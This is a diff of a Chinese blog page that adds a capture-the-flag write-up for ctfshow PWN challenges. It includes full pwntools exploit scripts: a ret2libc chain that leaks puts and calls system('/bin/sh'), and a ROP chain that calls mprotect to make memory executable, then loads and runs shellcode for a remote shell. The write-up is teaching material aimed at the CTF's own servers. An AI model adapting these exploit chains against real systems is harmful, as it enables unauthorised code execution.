+<p><img src="/p/ctfshow-pwn-writeup/153.png"
+	width="936"
+	height="199"
+	srcset="/p/ctfshow-pwn-writeup/153_hu_db48b024a3718cbf.png 480w, /p/ctfshow-pwn-writeup/153_hu_7601ca075a457054.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="470"
+		data-flex-basis="1128px"
+	
+></p>
+<p>跟进ctfshow函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/154.png"
+	width="746"
+	height="140"
+	srcset="/p/ctfshow-pwn-writeup/154_hu_6bb66ac2c50192d8.png 480w, /p/ctfshow-pwn-writeup/154_hu_277011d3545cec3e.png 1024w"
+	loading="lazy"
+	
+		alt="有栈溢出"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="532"
+		data-flex-basis="1278px"
+	
+></p>
+<p>编写exp泄露puts的地址，得出偏移量区反推出system函数、/bin/sh的地址。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28189</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;O.o?&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#\xf7 是程序输出中 write、puts 地址的标志性末尾字节。通过 recvuntil(&#39;\xf7&#39;)，可以确保：读取到的内容 “包含 puts 地址的完整有效部分”（因为只有遇到 \xf7 才会停止读取）。避免因程序输出存在其他干扰数据，导致 recv(4) 提前截取到错误的 4 字节。</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">))</span>   <span class="c1">#可要可不要，只是方便检查</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_049">PWN_049
+</h3><p>题目：静态编译？或许你可以找找mprotect函数。 <a class="link" href="PWN_049" >PWN_049</a></p>
+<p>checksec一下，没开canary、PIE、NX保护。</p>
+<p>IDA32：</p>
+<p><img src="/p/ctfshow-pwn-writeup/155.png"
+	width="1281"
+	height="516"
+	srcset="/p/ctfshow-pwn-writeup/155_hu_b973c2d823f63ff9.png 480w, /p/ctfshow-pwn-writeup/155_hu_b3772a185c0448ca.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p>可以看到有非常多的函数，这就是静态编译。</p>
+<p>跟进ctfshow函数，看到read有栈溢出漏洞。</p>
+<p><img src="/p/ctfshow-pwn-writeup/157.png"
+	width="654"
+	height="149"
+	srcset="/p/ctfshow-pwn-writeup/157_hu_9ddface01add7ae3.png 480w, /p/ctfshow-pwn-writeup/157_hu_e826473b4239865f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="438"
+		data-flex-basis="1053px"
+	
+></p>
+<p>找mprotect函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/156.png"
+	width="820"
+	height="205"
+	srcset="/p/ctfshow-pwn-writeup/156_hu_4c4ae03dbf0da030.png 480w, /p/ctfshow-pwn-writeup/156_hu_5d71e420e11b0740.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="400"
+		data-flex-basis="960px"
+	
+></p>
+<h4 id="mprotect函数">Mprotect函数
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">mprotect</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">sys_mprotect</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&gt;=</span> <span class="mh">0xFFFFF001</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_syscall_error</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<h5 id="代码解析">代码解析：
+</h5><ol>
+<li><strong>函数参数</strong>：</li>
+</ol>
+<ul>
+<li><code>a1</code>：要修改权限的内存起始地址（需页对齐）。</li>
+<li><code>a2</code>：内存区域的长度（字节数）。</li>
+<li><code>a3</code>：新的保护权限（如 <code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 、<code>PROT_NONE</code>、<code>prot=7</code>）。prot可以取这几个值，并且可以用“|”将几个属性合起来使用。</li>
+</ul>
+<ol start="2">
+<li><strong>核心逻辑</strong>：</li>
+</ol>
+<ul>
+<li>调用 <code>sys_mprotect</code>：这是真正的内核级系统调用（用户态到内核态的桥梁），负责实际执行内存权限修改操作。</li>
+<li>错误处理：<code>sys_mprotect</code> 的返回值若 <code>&gt;= 0xFFFFF001</code>（这是 Unix/Linux 中系统调用错误码的典型范围，通常表示操作失败），则通过 <code>_syscall_error()</code> 处理错误（例如设置 <code>errno</code> 并返回错误码）。</li>
+<li>成功返回：若系统调用成功，直接返回 <code>sys_mprotect</code> 的结果（通常为 0）。</li>
+</ul></blockquote>
+<p>这段代码是用户态 <code>mprotect</code> 函数的封装，本质是通过调用内核的 <code>sys_mprotect</code> 系统调用来实现功能，最终目的是：</p>
+<p><strong>允许进程动态修改某段内存的读写执行权限</strong>（例如将只读内存改为可写，或给数据段添加执行权限），常用于内存管理、动态代码加载、漏洞利用等场景。</p>
+<p>简单说，这段代码是用户程序与内核交互的 “中间层”，让开发者可以通过简单的函数调用修改内存权限，而无需直接操作内核接口。</p>
+<p>那么我们可以利用它修改内存的权限为可读可写可执 行（RWX），然后我们就可以往栈上写入shellcode、执行，最后获取shell。</p>
+<p>在构造 payload 前，需先确定 3 个核心要素：<strong>目标内存地址、<code>mprotect</code> 参数、控制寄存器的 Gadget</strong>，这些是 payload 的 “积木”。</p>
+<p>我们要选择的内存地址是<code>0x80DA000</code>，等会？这不是bss段吧？</p>
+<p><img src="/p/ctfshow-pwn-writeup/159.png"
+	width="1125"
+	height="494"
+	srcset="/p/ctfshow-pwn-writeup/159_hu_fb0f9122edba3687.png 480w, /p/ctfshow-pwn-writeup/159_hu_6ce7b5fc8e39cc95.png 1024w"
+	loading="lazy"
+	
+		alt="页对齐的地址"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="546px"
+	
+></p>
+<ul>
+<li><strong>选择原因</strong>：<code>mprotect</code> 要求操作的内存地址必须 <strong>页对齐</strong>（即地址是 4KB/0x1000 的整数倍，32 位系统默认页大小为 4KB）（64位就是8kb咯）。</li>
+<li>程序 BSS 段起始地址（如 <code>0x80DB320</code>）不满足页对齐，而 <code>0x80DA000</code> 是内存页的起始地址（末尾三位为 000，符合 4KB 对齐），且属于程序可访问的内存区域。</li>
+</ul>
+<p>然后就是mprotect函数参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">mprotect</span><span class="p">(</span><span class="n">const</span> <span class="n">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">a2</span><span class="p">,</span> <span class="nb">int</span> <span class="n">a3</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>a1是start起始地址，也就是0x80DA000；a2是长度范围，这里选择0x1000，足够我们容纳shellcode大小了；a3是prot，也就是修改成的权限范围，这里直接改为RWX，也就是简写<code>0x7</code>。</p>
+<p>最后是控制函数参数的工具——关键<code>gadgets</code></p>
+<p>32位程序用栈传参的，这里的mprotect函数有三个参数，且调用后需继续控制流程，因此需要 <code>pop ebx ; pop esi ; pop ebp ; ret</code> 这样的 Gadget，用ROPgadget指令查询地址：</p>
+<p><img src="/p/ctfshow-pwn-writeup/158.png"
+	width="1116"
+	height="505"
+	srcset="/p/ctfshow-pwn-writeup/158_hu_4a650557b39f9dbd.png 480w, /p/ctfshow-pwn-writeup/158_hu_f4b49bbc5059aa15.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="530px"
+	
+></p>
+<p>pop ebx ; pop esi ; pop ebp ; ret的地址是0x080a019b</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28132</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">mprotect</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_address</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ebx_esi_ebp_ret</span> <span class="o">=</span> <span class="mh">0x80a019b</span>
+</span></span><span class="line"><span class="cl"><span class="n">start</span> <span class="o">=</span> <span class="mh">0x80DA000</span>
+</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span>
+</span></span><span class="line"><span class="cl"><span class="n">proc</span> <span class="o">=</span> <span class="mh">0x7</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先填充缓冲区，调用mprotect函数，接着输入mprotect函数的3个参数，在此之前就要用到gadget：pop_ebx_esi_ebp_ret进行传参，按照mprotect函数的三个参数对应意义进行注入start、size、proc，这时已经给bss内存片段开放了可执行权限，然后读取read函数地址进而调用read函数，再用gadget：pop_ebx_esi_ebp_ret进行传read的3个参数，<strong>读取 后面我们所上传的shellcode 到目标内存</strong>来执行。最后上传shellcode。</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p>整个流程的核心逻辑就是通过栈溢出构建 “函数调用链”，逐步完成 “开权限→写代码→执行代码” 的攻击流程。</p></blockquote></blockquote>
+<p>对于这道题而言对我感触比较深，加深我对寄存器、gadget、整个函数调用流程、参数传递过程的理解！如果你觉得很难而跳过，那你就错过了一次PWN入门者的提升机会，博主当时啃这题花了快两天时间，凌晨才写完这题的writeup呢，花点耐心去学，PWNer！</p>
+<h3 id="pwn_050">PWN_050
+</h3><p>题目：好像哪里不一样了；远程libc环境 Ubuntu 18。 <a class="link" href="PWN_050" >PWN_050</a></p>
 
 </section>
 
@@ -4526,7 +5605,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-09-02
+            最后更新于 2025-09-11
         </span>
     </section></footer>
 
@@ -4756,7 +5835,7 @@ unicode: "ece7"
 <section class="wordcount">
   <div class="wordcount-row">
     <p>博主发布了7篇文章  ||</p>
-    <p>总共90.80k 字</p>
+    <p>总共109.74k 字</p>
   </div>
 </section>
         
